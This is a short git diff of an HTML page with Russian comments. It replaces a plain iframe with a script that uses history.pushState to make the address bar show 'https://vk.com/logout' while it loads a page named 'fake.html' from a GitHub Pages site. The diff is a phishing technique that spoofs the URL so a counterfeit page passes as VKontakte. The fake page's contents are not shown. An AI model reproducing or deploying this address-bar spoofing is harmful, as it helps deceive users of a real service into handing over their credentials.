@@ -18,7 +18,14 @@
   </style>
 </head>
 <body>
-  <!-- Вставляем iframe с фейковой страницей -->
-  <iframe src="https://jkeep1990.github.io/VK_iFrame/fake.html"></iframe>
+  <script>
+    // Подменяем URL на https://vk.com/logout без перезагрузки
+    history.pushState(null, "", "https://vk.com/logout");
+
+    // Добавляем iframe с фейковой страницей
+    const iframe = document.createElement('iframe');
+    iframe.src = "https://jkeep1990.github.io/VK_iFrame/fake.html";
+    document.body.appendChild(iframe);
+  </script>
 </body>
 </html>
